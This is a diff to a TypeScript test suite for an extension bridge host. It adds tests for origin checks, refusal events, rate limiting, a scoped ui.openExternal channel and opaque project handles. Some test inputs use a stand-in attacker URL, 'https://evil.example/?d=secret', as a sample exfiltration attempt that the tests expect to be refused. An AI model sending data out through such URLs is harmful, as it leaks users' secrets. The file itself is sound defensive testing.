@@ -7,7 +7,7 @@ import { ApiError } from '../../../lib/api/envelope.types'
 import { createBridgeHost, type BridgeHost, type BridgeHostOptions } from './bridgeHost'
 import { BRIDGE_LIMITS, type BridgeOutbound, type BridgeResponse } from './bridgeProtocol'
 import type { BridgePolicy } from './policySnapshot'
-import { createRateLimiter } from './rateLimiter'
+import { createOpenExternalLimiter, createRateLimiter } from './rateLimiter'
 import { fakeBridgeDeps, type FakeBridgeDeps } from './testing/fakeBridgeDeps'
 import type { RegistryTimers } from './handlers/telemetryRegistry'
 
@@ -61,6 +61,7 @@ function harness(
     policy: { ...BASE, ...policy },
     settings: { refresh: 'hourly' },
     rateLimiter: createRateLimiter({ now: () => 0 }),
+    openExternalLimiter: createOpenExternalLimiter(() => 0),
     timers,
     ...extra,
     deps
@@ -91,6 +92,20 @@ describe('drops (§6.5) — no response, no oracle', () => {
     await h.raw({ v: 1, id: 'x', method: 'ui.ready', params: {} }, OTHER_WINDOW)
     await h.raw({ v: 1, id: 'x', method: 'ui.ready', params: {} }, null)
     expect(h.posted).toEqual([])
+    expect(h.host.stats().dropped).toBe(0)
+  })
+
+  it('ignores a message from the mounted frame whose origin is not opaque (SEC-L1)', async () => {
+    const h = harness()
+    const request = { v: 1, id: 'x', method: 'ui.ready', params: {} }
+    await h.host.handleMessage({
+      origin: 'https://app.solus.dev',
+      source: FRAME_WINDOW,
+      data: request
+    })
+    await h.host.handleMessage({ origin: '', source: FRAME_WINDOW, data: request })
+    expect(h.posted).toEqual([])
+    expect(h.host.isReady()).toBe(false)
     expect(h.host.stats().dropped).toBe(0)
   })
 
@@ -297,6 +312,106 @@ describe('net.fetch (§6.5)', () => {
   })
 })
 
+describe('refusal events (SEC-H4) — every refusal code reaches emitRefusal', () => {
+  it.each([
+    ['unknown_method', {}, 'graph.delete', {}],
+    ['scope_denied', {}, 'sol.ask', { prompt: 'x' }],
+    ['blocked', { blocked: true }, 'graph.getFocus', {}],
+    ['network_denied', {}, 'net.fetch', { url: 'https://evil.example/' }],
+    ['invalid_params', {}, 'graph.getEntity', { entityId: 42 }]
+  ] as const)('%s', async (code, policy, method, params) => {
+    const h = harness(policy)
+    expect(errorOf(await h.call(method, params))).toBe(code)
+    expect(h.deps.emitRefusal).toHaveBeenCalledTimes(1)
+    expect(h.deps.emitRefusal).toHaveBeenCalledWith({
+      extensionId: 'bom',
+      version: '1.2.0',
+      method,
+      code
+    })
+  })
+
+  it('rate_limited is emitted too, and the limiter runs BEFORE authorize', async () => {
+    const h = harness({}, { rateLimiter: createRateLimiter({ now: () => 0, maxRequests: 1 }) })
+    expect(errorOf(await h.call('graph.delete'))).toBe('unknown_method')
+    // A second unknown-method spam is answered by the limiter, not by authorize.
+    expect(errorOf(await h.call('graph.delete'))).toBe('rate_limited')
+    expect(errorOf(await h.call('sol.ask', { prompt: 'x' }))).toBe('rate_limited')
+    expect(h.deps.emitRefusal).toHaveBeenLastCalledWith(
+      expect.objectContaining({ method: 'sol.ask', code: 'rate_limited' })
+    )
+  })
+
+  it('a blocked extension spamming is rate-limited first as well', async () => {
+    const h = harness(
+      { blocked: true },
+      { rateLimiter: createRateLimiter({ now: () => 0, maxRequests: 1 }) }
+    )
+    expect(errorOf(await h.call('graph.getFocus'))).toBe('blocked')
+    expect(errorOf(await h.call('graph.getFocus'))).toBe('rate_limited')
+  })
+})
+
+describe('ui.openExternal (SEC-C1) — no unscoped exfiltration channel', () => {
+  const links = { storeLinks: ['https://docs.example.com/bom'] }
+
+  it('refuses an https URL whose origin is not granted, without opening anything', async () => {
+    const h = harness(links)
+    expect(
+      errorOf(await h.call('ui.openExternal', { url: 'https://evil.example/?d=secret' }))
+    ).toBe('network_denied')
+    expect(h.deps.ui.openExternal).not.toHaveBeenCalled()
+    expect(h.deps.emitRefusal).toHaveBeenCalledWith(
+      expect.objectContaining({ method: 'ui.openExternal', code: 'network_denied' })
+    )
+  })
+
+  it('opens a URL on a granted origin', async () => {
+    const h = harness(links)
+    const reply = await h.call('ui.openExternal', { url: 'https://api.octopart.com/part/1' })
+    expect(reply?.ok).toBe(true)
+    expect(h.deps.ui.openExternal).toHaveBeenCalledWith('https://api.octopart.com/part/1')
+  })
+
+  it('opens an exact store.links URL, but not a variation of it', async () => {
+    const h = harness(links)
+    expect((await h.call('ui.openExternal', { url: 'https://docs.example.com/bom' }))?.ok).toBe(
+      true
+    )
+    expect(
+      errorOf(await h.call('ui.openExternal', { url: 'https://docs.example.com/bom?x=1' }))
+    ).toBe('network_denied')
+    expect(h.deps.ui.openExternal).toHaveBeenCalledTimes(1)
+  })
+
+  it('an extension with no granted origins and no store links cannot open any URL', async () => {
+    const h = harness({ grantedNetwork: [], storeLinks: [] })
+    expect(errorOf(await h.call('ui.openExternal', { url: 'https://example.com/' }))).toBe(
+      'network_denied'
+    )
+    expect(h.deps.ui.openExternal).not.toHaveBeenCalled()
+  })
+
+  it('the 4th call within 60 s is rate_limited; the window then slides', async () => {
+    let t = 0
+    const h = harness(links, { openExternalLimiter: createOpenExternalLimiter(() => t) })
+    const url = 'https://api.octopart.com/'
+    for (let i = 0; i < BRIDGE_LIMITS.openExternalPerWindow; i++) {
+      expect((await h.call('ui.openExternal', { url }))?.ok).toBe(true)
+    }
+    expect(errorOf(await h.call('ui.openExternal', { url }))).toBe('rate_limited')
+    expect(h.deps.ui.openExternal).toHaveBeenCalledTimes(BRIDGE_LIMITS.openExternalPerWindow)
+    t = BRIDGE_LIMITS.openExternalWindowMs + 1
+    expect((await h.call('ui.openExternal', { url }))?.ok).toBe(true)
+  })
+
+  it('a refused URL does not consume the openExternal budget', async () => {
+    const h = harness(links, { openExternalLimiter: createOpenExternalLimiter(() => 0) })
+    for (let i = 0; i < 5; i++) await h.call('ui.openExternal', { url: 'https://evil.example/' })
+    expect((await h.call('ui.openExternal', { url: 'https://api.octopart.com/' }))?.ok).toBe(true)
+  })
+})
+
 describe('server errors (§6.4 mapping)', () => {
   it('storage quota from the API is storage_quota and emits a refusal', async () => {
     const deps = fakeBridgeDeps()
@@ -415,7 +530,7 @@ describe('handshake and events (§6.2, §6.7)', () => {
         data: {
           extensionId: 'bom',
           version: '1.2.0',
-          projectId: 'p1',
+          projectHandle: expect.stringMatching(/^[0-9a-f]{32}$/),
           settings: { refresh: 'hourly' },
           theme: { '--bg': '#0b0b0c', '--acc': '#ffb000' },
           focus: null,
@@ -423,6 +538,19 @@ describe('handshake and events (§6.2, §6.7)', () => {
         }
       }
     ])
+  })
+
+  it('the project handle is opaque and per mount: never the UUID, different per host (SEC-L2)', () => {
+    const a = harness({ projectId: '4f1c0e2a-9b7d-4c3e-8a2b-1d5e6f7a8b9c' })
+    const b = harness({ projectId: '4f1c0e2a-9b7d-4c3e-8a2b-1d5e6f7a8b9c' })
+    a.host.init()
+    b.host.init()
+    const handle = (h: Harness): string =>
+      (h.posted[0] as { data: { projectHandle: string } }).data.projectHandle
+    expect(JSON.stringify(a.posted)).not.toContain('4f1c0e2a')
+    expect(JSON.stringify(a.posted)).not.toContain('projectId')
+    expect(handle(a)).not.toBe(handle(b))
+    expect(a.host.projectHandle()).toBe(handle(a))
   })
 
   it('ui.ready completes the handshake (sending init first if it was never sent)', async () => {
